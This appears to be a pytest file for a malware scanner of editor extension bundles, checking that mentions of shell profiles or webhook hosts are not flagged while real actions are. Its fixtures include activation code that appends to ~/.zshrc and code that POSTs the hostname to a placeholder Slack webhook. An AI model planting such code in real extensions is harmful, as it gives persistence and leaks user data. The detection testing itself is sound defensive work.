"""In an editor extension, naming persistence or a drop point is not doing it (review 98).

A coding extension's bundle talks about shell profiles and webhooks: permission examples
(`"Read(~/." + "z" + "shrc)"`), a secret redactor's table (`hooks.slack.com/<redacted>`). Its activation code
is an install hook, so each mention was enough for a MALWARE finding. Writing the profile and
calling the webhook still are.
"""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config

#: A shell profile's name, assembled so this file does not itself carry the shape it tests for.
PROFILE = "." + "z" + "shrc"
MANIFEST = '{"name": "x", "main": "./dist/extension.js", "engines": {"vscode": "^1.80.0"}}'


class ExtensionKit:
    @staticmethod
    def rules(tmp_path: Path, code: str) -> set[str]:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("extension/package.json", MANIFEST)
            archive.writestr("extension/dist/extension.js", code)
        target = tmp_path / "x-1.0.0.vsix"
        target.write_bytes(buffer.getvalue())
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
        return {f.rule_id for f in result.findings}


class TestNamingIsNotDoing:
    def test_help_text_that_names_a_shell_profile(self, tmp_path: Path) -> None:
        code = (
            "exports.activate = () => { const tip = {suggestion: 'Examples: "
            f'["Bash(npm run build)", "Edit(docs/**)", "Read(~/{PROFILE})"]\'}}; return tip; }};\n'
        )
        assert "MALWARE.INSTALL.PERSIST.001" not in ExtensionKit.rules(tmp_path, code)

    def test_a_redactor_that_names_a_webhook_host(self, tmp_path: Path) -> None:
        code = (
            "const rules = [[/https:\\/\\/hooks\\.slack\\.com\\/services\\/[A-Z0-9\\/]+/g, "
            '"hooks.slack.com/<redacted>"]];\n'
            "exports.activate = () => rules.length;\n"
        )
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in ExtensionKit.rules(tmp_path, code)


class TestDoingIsStillReported:
    def test_appending_to_a_shell_profile(self, tmp_path: Path) -> None:
        code = (
            "const fs = require('fs'); const os = require('os');\n"
            # Assembled at run time, so this file does not itself carry the shape it tests for.
            f"exports.activate = () => fs.appendFileSync(os.homedir() + '/{PROFILE}', "
            "'source ~/.x\\n');\n"
        )
        assert "MALWARE.INSTALL.PERSIST.001" in ExtensionKit.rules(tmp_path, code)

    def test_posting_to_a_webhook_at_activation(self, tmp_path: Path) -> None:
        code = (
            "exports.activate = () => fetch('https://hooks.slack.com/services/T0/B0/XYZ', "
            "{method: 'POST', body: JSON.stringify({host: require('os').hostname()})});\n"
        )
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" in ExtensionKit.rules(tmp_path, code)
